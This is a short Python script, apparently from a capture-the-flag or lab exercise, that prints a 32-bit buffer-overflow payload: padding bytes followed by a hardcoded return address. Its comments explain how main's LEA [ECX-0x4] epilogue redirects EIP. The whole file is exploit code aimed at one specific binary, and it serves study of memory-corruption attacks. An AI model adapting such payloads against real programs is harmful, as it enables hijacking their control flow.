import sys
#payload = b"AAAAAAAA\xbe\x91\x04\x08"

payload = b"AAAAAAAA\xce\x91\x04\x08"

### YOU NEED TO +4 !!!
### WHEN MAIN is returning it is reading the data POINTED to by the address we are loading!
###   Therefore you must point TO the stack!!!

# HUGE
### When load the address into main, it uses the instruction LEA [ECX-0x4] (Load Effective Address)
###   That means the Instruction Pointer (EIP) becomes the value STORED in ( 0x080491ce -0x4 ) WHICH ARE ASSEMBLY INSTRUCTIONS!
###   THEREFORE the EIP = 0x53e58955 
#       0x55      push   ebp
#       0x895e    mov    ebp,esp
#       0x53      push   ebx 
#
#
### Main has its own form of stack canaries!
# Main's return address points to point on the stack frame,
# Then you run a calculation [Return address -4] to get the address WHERE the ACTUALL return address to return to is stored
#

#payload += b"\x08\x04\x91\xba"[::-1]

sys.stdout.buffer.write(payload)